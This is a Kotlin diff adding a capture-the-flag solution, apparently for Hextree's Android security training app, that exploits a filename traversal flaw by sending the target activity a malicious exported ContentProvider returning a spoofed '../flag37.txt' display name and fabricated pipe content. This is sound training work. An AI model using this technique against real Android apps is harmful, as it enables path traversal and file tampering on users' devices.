@@ -505,4 +505,32 @@ class Attack(private val context: Context, private val activity: HextreeActivity
 		activity.startActivityForResult(intent, 36)
 	}
 
+	/**
+	 * FLAG 37 - Filename Traversal
+	 * Technique: Custom malicious ContentProvider fabricating file metadata + content
+	 *
+	 * Flow:
+	 * 1. We register our own exported ContentProvider (FileAttackProvider)
+	 * 2. Send its URI to Flag37Activity via intent.data with FLAG_GRANT_READ_URI_PERMISSION
+	 * 3. Flag37Activity queries us - we return a fake Cursor claiming
+	 *    _display_name="../flag37.txt" and _size=1337 (no real file backs this)
+	 * 4. It then calls openFile() on the same URI - we stream "give flag" through
+	 *    a pipe (ParcelFileDescriptor.createPipe()) instead of a real file
+	 * 5. All three checks pass (name + size + exact content) -> success()
+	 *
+	 * Key insight: ContentProvider never validates that query() and openFile() agree
+	 * with reality - they're two independent calls we fully control. A pipe lets us
+	 * fabricate file content live, with nothing on disk at all. exported="true" is
+	 * required since Flag37Activity runs in a different app/UID than ours.
+	 */
+	fun flag37() {
+		val activityPath = "$packageName.activities.Flag37Activity"
+
+		val intent = Intent().apply {
+			setClassName(packageName, activityPath)
+			data = "content://io.hextree.fileattack.FileAttackProvider".toUri()
+			addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
+		}
+		activity.startActivityForResult(intent, 37)
+	}
 }
